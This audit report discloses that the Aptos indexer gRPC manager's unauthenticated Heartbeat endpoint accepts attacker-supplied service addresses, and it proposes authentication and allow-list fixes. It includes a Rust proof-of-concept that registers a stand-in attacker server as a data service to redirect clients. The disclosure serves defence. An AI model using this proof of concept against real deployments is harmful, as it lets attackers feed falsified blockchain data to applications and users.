# Audit Report

## Title
Unauthenticated Service Registration Allows Malicious Address Injection in Indexer gRPC Manager

## Summary
The Indexer gRPC Manager exposes an unauthenticated `Heartbeat` RPC endpoint that allows any network attacker to inject malicious service addresses into the MetadataManager's service registry. This enables man-in-the-middle attacks on indexer transaction data by redirecting clients to attacker-controlled servers that can serve falsified blockchain data.

## Finding Description

The vulnerability exists in the heartbeat registration mechanism of the indexer-grpc-manager component. The issue spans multiple files: [1](#0-0) 

The `heartbeat` gRPC endpoint accepts unauthenticated requests and extracts the service address directly from the client-provided `ServiceInfo.address` field without validation. This address is then passed to: [2](#0-1) 

The `handle_heartbeat` method dispatches to type-specific handlers which unconditionally register the address: [3](#0-2) 

The critical vulnerability is at line 497 where `or_insert(LiveDataService::new(address))` creates a new gRPC client connection to the attacker-supplied address without any authentication or validation. The same pattern exists for historical data services, fullnodes, and other grpc managers.

**Attack Flow:**

1. Attacker crafts a `HeartbeatRequest` with:
   - `service_info.address = "http://attacker-controlled-server.com"`  
   - `service_info.live_data_service_info = {chain_id, timestamp, known_latest_version, min_servable_version}`

2. Attacker sends this to the GrpcManager's public `Heartbeat` endpoint

3. The malicious address is registered in `live_data_services` map

4. When legitimate clients call `GetDataServiceForRequest`, the selection algorithm may pick the attacker's service: [4](#0-3) 

5. Clients are redirected to the attacker's server and receive falsified transaction data

The protobuf definition confirms the structure is attacker-controllable: [5](#0-4) 

## Impact Explanation

This vulnerability qualifies as **High Severity** per the Aptos bug bounty criteria for the following reasons:

1. **Significant Protocol Violations**: The indexer gRPC protocol's security model is violated as untrusted parties can register as legitimate data services

2. **API/Service Impact**: Applications and services relying on the indexer manager will receive falsified blockchain data, leading to:
   - Incorrect application state
   - Financial losses for users/applications making decisions on corrupted data
   - Widespread data integrity compromise across the indexer infrastructure

3. **Potential API Crashes**: If the attacker's malicious server returns malformed responses, it could crash downstream services

While this does not directly affect blockchain consensus or validator operations (as the indexer is off-chain infrastructure), it compromises a critical component of the Aptos ecosystem that many applications depend on for blockchain data access.

## Likelihood Explanation

**Likelihood: HIGH**

The attack is trivially exploitable with minimal prerequisites:

- **Network Access**: Attacker only needs network connectivity to the GrpcManager service (typically exposed for legitimate services to register)
- **No Authentication**: Zero authentication or authorization checks exist
- **Simple Exploitation**: Crafting a malicious HeartbeatRequest requires basic gRPC knowledge
- **Persistent Effect**: Once injected, the malicious address remains in the registry and will be selected by clients
- **No Detection**: No logging or validation exists to detect malicious registrations

The vulnerability is in production code that runs continuously, and the exposed endpoint is designed to be accessible for service discovery.

## Recommendation

Implement multiple layers of defense:

**1. Authentication/Authorization**: Add mutual TLS or token-based authentication to the Heartbeat endpoint [6](#0-5) 

**2. Address Validation**: Validate addresses against a whitelist configured at startup [7](#0-6) 

**3. Chain ID Verification**: Validate the chain_id in service info matches the expected value:

```rust
fn handle_live_data_service_info(
    &self,
    address: GrpcAddress,
    mut info: LiveDataServiceInfo,
) -> Result<()> {
    // ADD VALIDATION
    if info.chain_id != self.chain_id {
        bail!("Chain ID mismatch: expected {}, got {}", self.chain_id, info.chain_id);
    }
    
    // Only allow pre-configured addresses
    if !self.is_allowed_address(&address) {
        bail!("Unauthorized address attempted registration: {}", address);
    }
    
    let mut entry = self
        .live_data_services
        .entry(address.clone())
        .or_insert(LiveDataService::new(address));
    // ... rest of function
}
```

**4. Configuration-Based Registration**: Only allow services listed in the initial configuration to register via heartbeat, not arbitrary addresses from network requests.

## Proof of Concept

```rust
// Rust test demonstrating the vulnerability
#[tokio::test]
async fn test_malicious_heartbeat_injection() {
    use aptos_protos::indexer::v1::{
        grpc_manager_client::GrpcManagerClient,
        HeartbeatRequest, ServiceInfo, LiveDataServiceInfo,
        service_info::Info,
    };
    use aptos_protos::util::timestamp::Timestamp;
    
    // Setup: Start a GrpcManager instance
    let manager_address = "http://127.0.0.1:50051";
    let malicious_address = "http://attacker-controlled-server.com:8080";
    
    // Attacker crafts malicious heartbeat
    let request = HeartbeatRequest {
        service_info: Some(ServiceInfo {
            address: Some(malicious_address.to_string()),
            info: Some(Info::LiveDataServiceInfo(LiveDataServiceInfo {
                chain_id: 1, // Mainnet chain ID
                timestamp: Some(Timestamp {
                    seconds: 1234567890,
                    nanos: 0,
                }),
                known_latest_version: Some(1000000),
                min_servable_version: Some(0),
                stream_info: None,
            })),
        }),
    };
    
    // Attacker sends heartbeat to manager
    let mut client = GrpcManagerClient::connect(manager_address).await.unwrap();
    let response = client.heartbeat(request).await;
    
    assert!(response.is_ok(), "Malicious heartbeat was rejected");
    
    // Verify malicious address is now in the service pool
    // When clients query for data service, they may be redirected to attacker
    let get_service_request = GetDataServiceForRequestRequest {
        user_request: Some(GetTransactionsRequest {
            starting_version: Some(500000),
            ..Default::default()
        }),
    };
    
    let service_response = client
        .get_data_service_for_request(get_service_request)
        .await
        .unwrap()
        .into_inner();
    
    // There's a chance the attacker's service is selected
    // In a real attack, the attacker would send multiple heartbeats
    // to increase their probability of being selected
    println!("Selected service: {}", service_response.data_service_address);
}
```

## Notes

- This vulnerability affects the **off-chain indexer infrastructure**, not the core blockchain consensus or validator operations
- While it doesn't compromise blockchain consensus, it can cause significant harm to applications and users relying on indexer data
- The configuration loading mechanism via environment variables was also examined, but requires system-level access, making it a separate operational security concern rather than an exploitable vulnerability
- The initial security question correctly identifies this as a High severity issue in the context of the indexer infrastructure's security model

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L71-88)
```rust
    fn pick_live_data_service(&self, starting_version: u64) -> Option<String> {
        let mut candidates = vec![];
        for candidate in self.metadata_manager.get_live_data_services_info() {
            if let Some(info) = candidate.1.back().as_ref() {
                // TODO(grao): Handle the case when the requested starting version is beyond the
                // latest version.
                if info.min_servable_version.is_none()
                    || starting_version < info.min_servable_version.unwrap()
                {
                    continue;
                }
                let num_active_streams = info.stream_info.as_ref().unwrap().active_streams.len();
                candidates.push((candidate.0, num_active_streams));
            }
        }

        Self::pick_data_service_from_candidate(candidates)
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L110-127)
```rust
    async fn heartbeat(
        &self,
        request: Request<HeartbeatRequest>,
    ) -> Result<Response<HeartbeatResponse>, Status> {
        let request = request.into_inner();
        if let Some(service_info) = request.service_info {
            if let Some(address) = service_info.address {
                if let Some(info) = service_info.info {
                    return self
                        .handle_heartbeat(address, info)
                        .await
                        .map_err(|e| Status::internal(format!("Error handling heartbeat: {e}")));
                }
            }
        }

        Err(Status::invalid_argument("Bad request."))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L330-339)
```rust
    pub(crate) fn handle_heartbeat(&self, address: GrpcAddress, info: Info) -> Result<()> {
        match info {
            Info::LiveDataServiceInfo(info) => self.handle_live_data_service_info(address, info),
            Info::HistoricalDataServiceInfo(info) => {
                self.handle_historical_data_service_info(address, info)
            },
            Info::FullnodeInfo(info) => self.handle_fullnode_info(address, info),
            Info::GrpcManagerInfo(info) => self.handle_grpc_manager_info(address, info),
        }
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L489-509)
```rust
    fn handle_live_data_service_info(
        &self,
        address: GrpcAddress,
        mut info: LiveDataServiceInfo,
    ) -> Result<()> {
        let mut entry = self
            .live_data_services
            .entry(address.clone())
            .or_insert(LiveDataService::new(address));
        if info.stream_info.is_none() {
            info.stream_info = Some(StreamInfo {
                active_streams: vec![],
            });
        }
        entry.value_mut().recent_states.push_back(info);
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
    }
```

**File:** protos/proto/aptos/indexer/v1/grpc.proto (L64-76)
```text
message ServiceInfo {
  optional string address = 1;
  oneof info {
      LiveDataServiceInfo live_data_service_info = 2;
      HistoricalDataServiceInfo historical_data_service_info = 3;
      FullnodeInfo fullnode_info = 4;
      GrpcManagerInfo grpc_manager_info = 5;
  }
}

message HeartbeatRequest {
  optional ServiceInfo service_info = 1;
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service/src/config.rs (L58-63)
```rust
    /// Deprecated: a list of auth tokens that are allowed to access the service.
    #[serde(default)]
    pub whitelisted_auth_tokens: Vec<String>,
    /// Deprecated: if set, don't check for auth tokens.
    #[serde(default)]
    pub disable_auth_check: bool,
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/config.rs (L38-39)
```rust
    pub(crate) grpc_manager_addresses: Vec<GrpcAddress>,
    pub(crate) fullnode_addresses: Vec<GrpcAddress>,
```
